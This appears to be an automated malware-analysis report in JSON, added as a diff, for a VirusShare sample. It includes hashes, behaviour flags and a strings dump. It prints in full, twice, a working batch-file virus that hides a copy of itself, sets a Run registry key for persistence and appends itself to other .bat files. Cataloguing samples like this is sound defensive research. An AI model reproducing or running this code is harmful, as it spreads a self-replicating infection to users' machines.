@@ -1,0 +1,62 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Call": "May call a DLL using Excel 4 Macros",
+            "Run": "May run an executable file or a system command",
+            "SYSTEM": "May run an executable file or a system command on a Mac",
+            "WINDOWS": "May enumerate application windows"
+        },
+        "macro": " @:: [REGgIE] registry&bat virus by MI_pirat\n@echo off\nif not exist C:\\_!#$.bat copy %0 C:\\_!#$.bat\nattrib C:\\_!#$.bat +h +r\nif not exist C:\\WINDOWS\\SYSTEM\\reg.reg goto reg\ngoto vir\n:reg\necho REGEDIT4>>C:\\WINDOWS\\SYSTEM\\reg.reg\necho [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]>>C:\\WINDOWS\\SYSTEM\\reg.reg\necho \"reg\"=\"C:\\\\_!#$.bat\">>C:\\WINDOWS\\SYSTEM\\reg.reg\nC:\\windows\\regedit.exe C:\\windows\\system\\reg.reg\n:vir\nif exist %1\\nul goto scr\nfind /i \"[REGgIE]\" <%1>nul\nif not errorlevel 1 goto end\ngoto xxx\n:scr \nfor %%a in (*.bat) do Call %0 %%a\n:xxx\ntype %0>>%1\n:end"
+    },
+    "filename": "VirusShare_3a900f833432a0cfef15a25cecc0c2b6",
+    "filesize": 607,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3a900f833432a0cfef15a25cecc0c2b6",
+        "sha1": "ae937d0f079d281d4923490c07812c3b80f23c01",
+        "sha256": "c942f73a84dacf4a88e94380e78475d8df391da50055af3c36c0e184233b6524"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            " @:: [REGgIE] registry&bat virus by MI_pirat",
+            "@echo off",
+            "if not exist C:\\_!#$.bat copy %0 C:\\_!#$.bat",
+            "attrib C:\\_!#$.bat +h +r",
+            "if not exist C:\\WINDOWS\\SYSTEM\\reg.reg goto reg",
+            "goto vir",
+            ":reg",
+            "echo REGEDIT4>>C:\\WINDOWS\\SYSTEM\\reg.reg",
+            "echo [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]>>C:\\WINDOWS\\SYSTEM\\reg.reg",
+            "echo \"reg\"=\"C:\\\\_!#$.bat\">>C:\\WINDOWS\\SYSTEM\\reg.reg",
+            "C:\\windows\\regedit.exe C:\\windows\\system\\reg.reg",
+            ":vir",
+            "if exist %1\\nul goto scr",
+            "find /i \"[REGgIE]\" <%1>nul",
+            "if not errorlevel 1 goto end",
+            "goto xxx",
+            ":scr ",
+            "for %%a in (*.bat) do Call %0 %%a",
+            ":xxx",
+            "type %0>>%1",
+            ":end"
+        ],
+        "file": {
+            "C:\\windows\\regedit.exe C:\\windows\\system\\reg.reg": "Registry",
+            "echo \"reg\"=\"C:\\\\_!#$.bat\">>C:\\WINDOWS\\SYSTEM\\reg.reg": "Registry",
+            "echo REGEDIT4>>C:\\WINDOWS\\SYSTEM\\reg.reg": "Registry",
+            "echo [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]>>C:\\WINDOWS\\SYSTEM\\reg.reg": "Registry"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.267305",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
